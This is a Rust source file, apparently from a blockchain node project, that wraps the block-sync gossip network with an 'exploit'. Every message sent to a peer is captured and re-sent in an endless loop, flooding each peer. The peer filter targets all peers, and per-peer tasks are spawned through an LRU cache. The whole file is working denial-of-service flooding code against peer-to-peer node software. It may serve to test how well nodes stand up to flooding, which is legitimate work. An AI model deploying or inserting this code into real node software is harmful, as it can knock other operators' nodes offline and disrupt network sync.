use std::{
    borrow::BorrowMut,
    collections::{hash_map::Entry, HashMap, HashSet},
    num::NonZeroUsize,
    sync::Arc,
};

use futures::{channel::mpsc, Future, SinkExt, StreamExt};
use log::{debug, error, info, warn};
use lru::LruCache;
use network_clique::SpawnHandleT;
use sc_network::MessageSink;
use sc_network::PeerId;

use crate::{
    network::{Data, GossipNetwork},
    ProtocolNetwork,
};

const LOG_TARGET: &str = "aleph-sync-exploit";

struct ExploitedProtocolNetwork<Exploit = ()> {
    protocol_network: ProtocolNetwork,
    exploit: Exploit,
}

impl ExploitedProtocolNetwork {
    fn new_for_receiver(
        protocol_network: ProtocolNetwork,
        mut peer_filter: impl FnMut(&PeerId) -> bool + Send + 'static,
    ) -> (
        ExploitedProtocolNetwork<
            impl FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static,
        >,
        mpsc::Receiver<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>,
    ) {
        let (mut exploit_sender, exploit_receiver) = mpsc::channel(0);
        let mut filtered_peers = HashMap::new();
        let network = ExploitedProtocolNetwork {
            protocol_network,
            exploit: move |data, peer_id, protocol_network: &mut ProtocolNetwork| {
                if !peer_filter(&peer_id) {
                    filtered_peers.remove(&peer_id);
                    return;
                }
                let message_sink = match filtered_peers.entry(peer_id) {
                    Entry::Vacant(vacant) => {
                        let network_service: &Box<dyn sc_network::config::NotificationService> =
                            protocol_network.borrow_mut();
                        let Some(message_sink) = network_service.message_sink(&peer_id) else {
                            return;
                        };
                        vacant.insert(Arc::new(message_sink)).clone()
                    }
                    Entry::Occupied(message_sink) => {
                        message_sink.get().clone()
                    }
                };
                if let Err(true) = exploit_sender
                    .try_send((data, peer_id, message_sink))
                    .map_err(|err| err.is_disconnected())
                {
                    panic!("Exploit unexpectedly died.");
                }
            },
        };
        (network, exploit_receiver)
    }

    pub fn new<SH>(
        protocol_network: ProtocolNetwork,
        peer_filter: impl FnMut(&PeerId) -> bool + Send + 'static,
        spawn_handle: SH,
    ) -> (
        ExploitedProtocolNetwork<
            impl FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static,
        >,
        impl Future<Output = Result<(), &'static str>> + Send,
    )
    where
        SH: SpawnHandleT + Send,
    {
        let (network, exploit_receiver) = Self::new_for_receiver(protocol_network, peer_filter);
        let exploit = MultiPeerNetworkSendExploit::new(spawn_handle, exploit_receiver).run();
        (network, exploit)
    }
}

#[async_trait::async_trait]
impl<Exploit: FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static, D: Data>
    GossipNetwork<D> for ExploitedProtocolNetwork<Exploit>
{
    type Error = <ProtocolNetwork as GossipNetwork<D>>::Error;
    type PeerId = <ProtocolNetwork as GossipNetwork<D>>::PeerId;

    fn send_to(&mut self, data: D, peer_id: Self::PeerId) -> Result<(), Self::Error> {
        (self.exploit)(data.encode(), peer_id.clone(), &mut self.protocol_network);
        self.protocol_network.send_to(data, peer_id)
    }

    fn send_to_random(
        &mut self,
        data: D,
        peer_ids: HashSet<Self::PeerId>,
    ) -> Result<(), Self::Error> {
        self.protocol_network.send_to_random(data, peer_ids)
    }

    fn broadcast(&mut self, data: D) -> Result<(), Self::Error> {
        self.protocol_network.broadcast(data)
    }

    async fn next(&mut self) -> Result<(D, PeerId), Self::Error> {
        self.protocol_network.next().await
    }
}

struct NetworkSendExploit {
    data: futures::channel::mpsc::Receiver<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>,
}

impl NetworkSendExploit {
    pub fn new(
        receiver: futures::channel::mpsc::Receiver<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>,
    ) -> Self {
        Self { data: receiver }
    }
}

impl NetworkSendExploit {
    pub async fn run(mut self) -> Result<(), &'static str> {
        // we try to send as many copies as we can  of some valid message
        let (mut message, _, mut sink) = self
            .data
            .next()
            .await
            .ok_or_else(|| "data stream was closed")?;
        loop {
            sink.send_async_notification(message.clone())
                .await
                .map_err(|_| "Connection to peer lost.")?;

            (message, _, sink) = match self.data.try_next() {
                Ok(Some(new_message)) => new_message,
                Ok(None) => return Err("data stream was suddenly closed"),
                Err(_) => continue,
            };
        }
    }
}

struct MultiPeerNetworkSendExploit<SH> {
    data: futures::channel::mpsc::Receiver<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>,
    spawn_handle: SH,
    peers: LruCache<PeerId, mpsc::Sender<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>>,
}

impl<SH> MultiPeerNetworkSendExploit<SH> {
    pub fn new(
        spawn_handle: SH,
        data_receiver: mpsc::Receiver<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>,
    ) -> Self {
        Self {
            data: data_receiver,
            spawn_handle,
            peers: LruCache::new(NonZeroUsize::new(10).expect("10 is greater than 0. qed")),
        }
    }
}

impl<SH: SpawnHandleT + Send> MultiPeerNetworkSendExploit<SH> {
    pub async fn run(mut self) -> Result<(), &'static str> {
        while let Some((data, peer_id, sink)) = self.data.next().await {
            let sender = self.peers.get_or_insert_mut(peer_id, || {
                let (exploit_sender, exploit_receiver) = mpsc::channel(0);
                self.spawn_handle.spawn("exploit-{peer_id}", async move {
                    if let Err(err) = NetworkSendExploit::new(exploit_receiver).run().await {
                        debug!(target: LOG_TARGET, "Some `NetworkSendExploit` returned an err: {err}");
                    }
                });
                exploit_sender
            });
            if let Err(err) = sender.send((data, peer_id, sink)).await {
                warn!(target: LOG_TARGET, "Unable to send data to instance of [`NetworkSendExploit`]: {err}. Removing peer...");
                self.peers.pop(&peer_id);
            }
        }
        warn!(target: LOG_TARGET, "Multi-node exploit exited too early.");
        Ok(())
    }
}

pub fn initialize_network_exploit<SH, D>(
    block_sync_network: crate::ProtocolNetwork,
    spawn_handle: &SH,
) -> impl GossipNetwork<D>
where
    SH: SpawnHandleT + Send + Clone + 'static,
    D: Data,
{
    info!(target: LOG_TARGET, "Initialazing the network exploit.");
    let exploit_spawn_handle = spawn_handle.clone();
    let (block_sync_network, exploit) = ExploitedProtocolNetwork::new(
        block_sync_network,
        move |peer_id| {
            debug!(target: LOG_TARGET, "Sync-network exploit will flood {peer_id} with messages.");
            return true;
        },
        exploit_spawn_handle,
    );

    spawn_handle.spawn("sync-network-exploit", async move {
        if let Err(err) = exploit.await {
            error!(
                target: LOG_TARGET,
                "Exploit finished with error: {}.", err
            );
        }
    });
    block_sync_network
}
